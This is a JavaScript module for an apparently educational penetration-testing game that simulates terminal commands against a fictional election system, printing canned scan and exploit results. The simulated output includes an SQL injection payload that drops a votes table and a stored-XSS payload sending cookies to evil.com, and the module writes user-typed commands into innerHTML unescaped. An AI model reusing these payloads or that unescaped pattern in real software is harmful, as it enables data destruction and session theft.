import { gameState, recordExploitRun } from '../gameState.js';
import { updateMentorMessage } from '../uiUpdates.js';

let currentContext = null;

export function processCommand(command, output) {
    const args = command.split(' ');
    const baseCommand = args[0];
    
    switch(baseCommand) {
        case 'help':
            showHelp(output);
            break;
        case 'clear':
            clearTerminal(output);
            break;
        case 'ls':
            listTargets(output);
            break;
        case 'nmap':
            runNetworkScan(output, args);
            break;
        case 'sqlmap':
            runSQLInjectionTest(output, args);
            break;
        case 'xss-test':
            runXSSTest(output, args);
            break;
        case 'contract-exploit':
            runContractExploit(output, args);
            break;
        case 'history':
            showCommandHistory(output);
            break;
        case 'whoami':
            showUserInfo(output);
            break;
        case 'pwd':
            showCurrentDirectory(output);
            break;
        case 'ps':
            showProcesses(output);
            break;
        case 'netstat':
            showNetworkConnections(output);
            break;
        case 'exploit':
            if (args[1]) {
                runSpecificExploit(output, args[1]);
            } else {
                showExploitHelp(output);
            }
            break;
        default:
            showCommandNotFound(output, command);
            break;
    }
}

function showHelp(output) {
    output.innerHTML += `
        <div class="text-cyan-400 mb-3">
            <div class="font-bold text-green-400 mb-2">📋 CyberQuest Penetration Testing Terminal v2.1</div>
            <div class="text-sm text-cyan-300 mb-3">Available commands for ethical security testing:</div>
            
            <div class="grid grid-cols-2 gap-x-6 gap-y-1 text-xs">
                <div class="text-yellow-400">🔍 RECONNAISSANCE</div>
                <div class="text-red-400">⚔️ EXPLOITATION</div>
                
                <div><span class="text-green-400 font-mono">nmap</span> <span class="text-gray-400">- Network port scanning</span></div>
                <div><span class="text-green-400 font-mono">sqlmap</span> <span class="text-gray-400">- SQL injection testing</span></div>
                
                <div><span class="text-green-400 font-mono">ls</span> <span class="text-gray-400">- List available targets</span></div>
                <div><span class="text-green-400 font-mono">xss-test</span> <span class="text-gray-400">- Cross-site scripting test</span></div>
                
                <div><span class="text-green-400 font-mono">netstat</span> <span class="text-gray-400">- Network connections</span></div>
                <div><span class="text-green-400 font-mono">contract-exploit</span> <span class="text-gray-400">- Smart contract testing</span></div>
                
                <div class="text-blue-400 mt-2">🛠️ SYSTEM TOOLS</div>
                <div class="text-orange-400 mt-2">📚 INFORMATION</div>
                
                <div><span class="text-green-400 font-mono">ps</span> <span class="text-gray-400">- Running processes</span></div>
                <div><span class="text-green-400 font-mono">whoami</span> <span class="text-gray-400">- Current user info</span></div>
                
                <div><span class="text-green-400 font-mono">pwd</span> <span class="text-gray-400">- Current directory</span></div>
                <div><span class="text-green-400 font-mono">history</span> <span class="text-gray-400">- Command history</span></div>
                
                <div><span class="text-green-400 font-mono">clear</span> <span class="text-gray-400">- Clear terminal</span></div>
                <div><span class="text-green-400 font-mono">help</span> <span class="text-gray-400">- Show this help</span></div>
            </div>
            
            <div class="mt-3 text-xs text-yellow-300">
                💡 <span class="font-semibold">Tip:</span> Add <span class="text-cyan-300 font-mono">?</span> to any command for detailed help (e.g., <span class="text-cyan-300 font-mono">sqlmap ?</span>)
            </div>
            
            <div class="mt-2 text-xs text-red-300">
                ⚠️ <span class="font-semibold">Ethical Notice:</span> Only test against authorized targets. Document all findings responsibly.
            </div>
        </div>
    `;
}

function clearTerminal(output) {
    output.innerHTML = '';
    updateMentorMessage("Terminal cleared. Ready for next security assessment.");
}

function listTargets(output) {
    output.innerHTML += `
        <div class="text-green-400 mb-2">
            <div class="font-bold mb-2">🎯 Available Test Targets:</div>
            <div class="space-y-2 text-sm">
                <div class="bg-red-900/30 border-l-4 border-red-500 pl-3">
                    <div class="text-red-300 font-semibold">civitas-vote.local:8080</div>
                    <div class="text-red-200 text-xs">Primary voting application - CRITICAL SYSTEM</div>
                </div>
                <div class="bg-orange-900/30 border-l-4 border-orange-500 pl-3">
                    <div class="text-orange-300 font-semibold">auth-api.civitas.local:443</div>
                    <div class="text-orange-200 text-xs">Authentication service - HIGH PRIORITY</div>
                </div>
                <div class="bg-yellow-900/30 border-l-4 border-yellow-500 pl-3">
                    <div class="text-yellow-300 font-semibold">blockchain.civitas.eth</div>
                    <div class="text-yellow-200 text-xs">Smart contract interface - MEDIUM RISK</div>
                </div>
                <div class="bg-blue-900/30 border-l-4 border-blue-500 pl-3">
                    <div class="text-blue-300 font-semibold">frontend.civitas.local</div>
                    <div class="text-blue-200 text-xs">User interface - LOW RISK</div>
                </div>
            </div>
            <div class="mt-2 text-xs text-cyan-300">
                Use specific tools (nmap, sqlmap, etc.) to test these targets
            </div>
        </div>
    `;
}

function runNetworkScan(output, args) {
    if (args.includes('?')) {
        output.innerHTML += `
            <div class="text-cyan-400 mb-2">
                <div class="font-bold">📡 NMAP - Network Mapper</div>
                <div class="text-sm mt-1">Usage: nmap [target] [options]</div>
                <div class="text-xs mt-2 space-y-1">
                    <div><span class="text-green-400">nmap civitas-vote.local</span> - Basic port scan</div>
                    <div><span class="text-green-400">nmap -sV civitas-vote.local</span> - Service version detection</div>
                    <div><span class="text-green-400">nmap -A civitas-vote.local</span> - Aggressive scan</div>
                </div>
            </div>
        `;
        return;
    }

    const target = args[1] || 'civitas-vote.local';
    
    output.innerHTML += `
        <div class="text-cyan-400">
            <div>Starting Nmap scan against ${target}...</div>
        </div>
    `;

    setTimeout(() => {
        output.innerHTML += `
            <div class="text-green-400 mb-2">
                <div class="font-mono text-xs">
PORT     STATE SERVICE    VERSION<br>
22/tcp   open  ssh        OpenSSH 8.9<br>
80/tcp   open  http       nginx 1.20.2<br>
443/tcp  open  https      nginx 1.20.2<br>
3306/tcp open  mysql      MySQL 8.0.28<br>
5432/tcp open  postgresql PostgreSQL 14.2<br>
8080/tcp open  http       Node.js Express<br><br>

<span class="text-yellow-400">⚠️ Notable findings:</span><br>
• Database ports exposed (MySQL 3306, PostgreSQL 5432)<br>
• Development server on port 8080<br>
• SSH service accessible<br><br>

<span class="text-red-400">🚨 Security concerns:</span><br>
• Database services should not be externally accessible<br>
• Multiple web services increase attack surface
                </div>
            </div>
        `;
        
        gameState.exploitsRun += 1;
        updateMentorMessage("Network scan reveals concerning service exposure. Database ports shouldn't be accessible externally.");
        output.scrollTop = output.scrollHeight;
    }, 2500);
}

function runSQLInjectionTest(output, args) {
    if (args.includes('?')) {
        output.innerHTML += `
            <div class="text-cyan-400 mb-2">
                <div class="font-bold">💉 SQLMAP - SQL Injection Toolkit</div>
                <div class="text-sm mt-1">Usage: sqlmap [target] [options]</div>
                <div class="text-xs mt-2 space-y-1">
                    <div><span class="text-green-400">sqlmap civitas-vote.local</span> - Basic injection test</div>
                    <div><span class="text-green-400">sqlmap --dbs</span> - Enumerate databases</div>
                    <div><span class="text-green-400">sqlmap --dump</span> - Extract data (DANGEROUS)</div>
                </div>
            </div>
        `;
        return;
    }

    output.innerHTML += `
        <div class="text-cyan-400">
            <div>Testing SQL injection vulnerabilities on voting system...</div>
        </div>
    `;

    setTimeout(() => {
        output.innerHTML += `
            <div class="text-red-400 mb-2">
                <div class="font-bold text-red-300">🚨 CRITICAL VULNERABILITY CONFIRMED</div>
                <div class="font-mono text-xs mt-2">
[INFO] Testing parameter 'voter_id' for SQL injection<br>
[CRITICAL] Time-based blind SQL injection found!<br>
[SUCCESS] Database: civitas_vote<br>
[SUCCESS] Tables found: voters(1,234 records), votes(5,678 records)<br><br>

<span class="text-yellow-400">Exploitable payload:</span><br>
POST /api/submit-vote<br>
voter_id: 1'; DROP TABLE votes; --<br><br>

<span class="text-red-400">⚠️ SEVERE RISK:</span><br>
• Complete database access possible<br>
• Vote records can be modified/deleted<br>
• Voter information exposed<br>
• ENTIRE ELECTION INTEGRITY AT RISK
                </div>
            </div>
        `;
        
        gameState.exploitsRun += 1;
        recordExploitRun('vote-processor', 'sql-injection', true);
        updateMentorMessage("CRITICAL: SQL injection confirmed in vote processing! This could compromise the entire election. Document this immediately.");
        output.scrollTop = output.scrollHeight;
    }, 3500);
}

function runXSSTest(output, args) {
    if (args.includes('?')) {
        output.innerHTML += `
            <div class="text-cyan-400 mb-2">
                <div class="font-bold">🕸️ XSS-TEST - Cross-Site Scripting Scanner</div>
                <div class="text-sm mt-1">Usage: xss-test [target] [options]</div>
                <div class="text-xs mt-2 space-y-1">
                    <div><span class="text-green-400">xss-test frontend.civitas.local</span> - Basic XSS scan</div>
                    <div><span class="text-green-400">xss-test --payload stored</span> - Test stored XSS</div>
                </div>
            </div>
        `;
        return;
    }

    output.innerHTML += `
        <div class="text-cyan-400">
            <div>Scanning for XSS vulnerabilities in voting interface...</div>
        </div>
    `;

    setTimeout(() => {
        output.innerHTML += `
            <div class="text-orange-400 mb-2">
                <div class="font-bold text-orange-300">⚠️ XSS VULNERABILITY DETECTED</div>
                <div class="font-mono text-xs mt-2">
[INFO] Testing XSS vectors in candidate display field<br>
[SUCCESS] Stored XSS confirmed in voting interface<br>
[PAYLOAD] &lt;script&gt;document.location='http://evil.com/'+document.cookie&lt;/script&gt;<br><br>

<span class="text-yellow-400">Attack vector:</span><br>
• Candidate name field accepts unfiltered HTML<br>
• JavaScript executes when votes are displayed<br>
• Session cookies can be stolen<br><br>

<span class="text-orange-400">Impact:</span><br>
• Voter session hijacking<br>
• Vote preference disclosure<br>
• Admin account compromise potential
                </div>
            </div>
        `;
        
        gameState.exploitsRun += 1;
        recordExploitRun('frontend-ui', 'xss', true);
        updateMentorMessage("XSS vulnerability could expose voter privacy and enable session hijacking. This compromises voter confidentiality.");
        output.scrollTop = output.scrollHeight;
    }, 3000);
}

function runContractExploit(output, args) {
    if (args.includes('?')) {
        output.innerHTML += `
            <div class="text-cyan-400 mb-2">
                <div class="font-bold">⛓️ CONTRACT-EXPLOIT - Smart Contract Analyzer</div>
                <div class="text-sm mt-1">Usage: contract-exploit [options]</div>
                <div class="text-xs mt-2 space-y-1">
                    <div><span class="text-green-400">contract-exploit --overflow</span> - Test integer overflow</div>
                    <div><span class="text-green-400">contract-exploit --reentrancy</span> - Test reentrancy attacks</div>
                </div>
            </div>
        `;
        return;
    }

    output.innerHTML += `
        <div class="text-cyan-400">
            <div>Analyzing smart contract for vulnerabilities...</div>
        </div>
    `;

    setTimeout(() => {
        output.innerHTML += `
            <div class="text-red-400 mb-2">
                <div class="font-bold text-red-300">🔥 MULTIPLE CRITICAL CONTRACT FLAWS</div>
                <div class="font-mono text-xs mt-2">
[CRITICAL] Integer overflow vulnerability detected<br>
[CRITICAL] Reentrancy attack vector found<br>
[CRITICAL] Missing access control on resetVotes()<br><br>

<span class="text-yellow-400">Exploit scenarios:</span><br>
1. <span class="text-red-300">Integer Overflow:</span> Vote count wraps to 0<br>
2. <span class="text-red-300">Reentrancy:</span> Multiple votes from single address<br>
3. <span class="text-red-300">Access Control:</span> Anyone can reset all votes<br><br>

<span class="text-red-400">⚠️ CATASTROPHIC RISK:</span><br>
• Vote counts can be manipulated to 0<br>
• Unlimited voting by attackers<br>
• Complete election results can be wiped<br>
• BLOCKCHAIN IMMUTABILITY COMPROMISED
                </div>
            </div>
        `;
        
        gameState.exploitsRun += 1;
        recordExploitRun('blockchain-api', 'contract-exploit', true);
        updateMentorMessage("Smart contract has devastating flaws! These vulnerabilities could completely invalidate election results and are permanent once deployed.");
        output.scrollTop = output.scrollHeight;
    }, 3500);
}

function showCommandHistory(output) {
    const history = JSON.parse(localStorage.getItem('terminalHistory') || '[]');
    
    output.innerHTML += `
        <div class="text-cyan-400 mb-2">
            <div class="font-bold">📜 Command History:</div>
            <div class="text-sm mt-1">
                ${history.length > 0 ? 
                    history.map((cmd, index) => `<div class="text-gray-300">${index + 1}. ${cmd}</div>`).join('') :
                    '<div class="text-gray-400">No commands in history</div>'
                }
            </div>
        </div>
    `;
}

function showUserInfo(output) {
    output.innerHTML += `
        <div class="text-green-400 mb-2">
            <div class="font-mono text-sm">
root@pentest-station<br>
UID: 0 (root)<br>
Groups: root, sudo, pentest<br>
Home: /root<br>
Shell: /bin/bash<br>
Session: Ethical Security Assessment<br>
Target: CivitasVote Election System<br>
Authorized by: Election Security Commission
            </div>
        </div>
    `;
}

function showCurrentDirectory(output) {
    output.innerHTML += `
        <div class="text-green-400 mb-2">
            <div class="font-mono">/root/security-assessment/civitas-vote</div>
        </div>
    `;
}

function showProcesses(output) {
    output.innerHTML += `
        <div class="text-green-400 mb-2">
            <div class="font-mono text-xs">
PID    COMMAND<br>
1234   sqlmap --batch --dbs<br>
1235   nmap -sV civitas-vote.local<br>
1236   wireshark -i eth0<br>
1237   burpsuite<br>
1238   metasploit-framework<br>
1239   docker run owasp/zap<br>
1240   python3 exploit-scanner.py
            </div>
        </div>
    `;
}

function showNetworkConnections(output) {
    output.innerHTML += `
        <div class="text-green-400 mb-2">
            <div class="font-mono text-xs">
Active Internet connections:<br>
Proto Local Address      Foreign Address     State<br>
tcp   192.168.1.100:22   10.0.0.50:45123     ESTABLISHED<br>
tcp   192.168.1.100:443  civitas-vote.local:80 TIME_WAIT<br>
tcp   192.168.1.100:8080 auth-api.civitas:443 ESTABLISHED<br>
tcp   192.168.1.100:3306 blockchain.civitas:8545 ESTABLISHED
            </div>
        </div>
    `;
}

function runSpecificExploit(output, exploitType) {
    output.innerHTML += `
        <div class="text-yellow-400 mb-2">
            <div>Launching specific exploit: ${exploitType}</div>
            <div class="text-xs text-red-300 mt-1">⚠️ This is a simulated environment for educational purposes</div>
        </div>
    `;

    setTimeout(() => {
        output.innerHTML += `
            <div class="text-red-400">
                <div class="font-mono text-xs">
[EXPLOIT] ${exploitType} executed<br>
[RESULT] Vulnerability demonstration complete<br>
[STATUS] Impact documented for responsible disclosure
                </div>
            </div>
        `;
        output.scrollTop = output.scrollHeight;
    }, 2000);
}

function showExploitHelp(output) {
    output.innerHTML += `
        <div class="text-cyan-400 mb-2">
            <div class="font-bold">💣 EXPLOIT - Vulnerability Testing Framework</div>
            <div class="text-sm mt-1">Usage: exploit [type]</div>
            <div class="text-xs mt-2 space-y-1">
                <div><span class="text-green-400">exploit buffer-overflow</span> - Test buffer overflow conditions</div>
                <div><span class="text-green-400">exploit privilege-escalation</span> - Test privilege escalation</div>
                <div><span class="text-green-400">exploit csrf</span> - Cross-site request forgery test</div>
            </div>
        </div>
    `;
}

function showCommandNotFound(output, command) {
    output.innerHTML += `
        <div class="text-red-400 mb-2">
            <div>Command not found: ${command}</div>
            <div class="text-xs text-gray-400 mt-1">Type 'help' to see available commands</div>
        </div>
    `;
}

export function setCurrentContext(context) {
    currentContext = context;
}

export function getCurrentContext() {
    return currentContext;
}
